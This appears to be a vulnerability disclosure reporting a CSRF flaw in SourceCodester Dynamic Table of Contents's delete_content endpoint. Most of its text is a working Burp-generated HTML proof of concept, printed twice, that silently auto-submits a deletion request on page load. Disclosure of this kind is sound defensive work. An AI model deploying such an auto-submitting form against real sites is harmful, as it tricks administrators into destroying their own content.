# Summary
There is a CSRF vulnerability in SourceCodester Dynamic Table of Contents `/ajax-api.php?action=delete_content`.
This vulnerability allows attackers to trick administrators into deleting published content.

# Details
Where the contents are deleted, there is no CSRF protection and a CSRF vulnerability exists:
![image](https://github.com/user-attachments/assets/97787d8a-afd6-4fea-bd12-08f5df7b7be7)

Use burpsuite to intercept the traffic packet:
![image](https://github.com/user-attachments/assets/7c8b4782-47f1-4dd1-8f3d-0fe0b7618415)

Use this PoC.html:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://d-toc:85/ajax-api.php?action=delete_content" method="POST">
      <input type="hidden" name="id" value="2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![d-toc-CSRF1](https://github.com/user-attachments/assets/f1445bbb-853d-49fe-9152-324ed104cd4d)


# PoC
PoC.html:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://d-toc:85/ajax-api.php?action=delete_content" method="POST">
      <input type="hidden" name="id" value="2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

![d-toc-CSRF1](https://github.com/user-attachments/assets/f1445bbb-853d-49fe-9152-324ed104cd4d)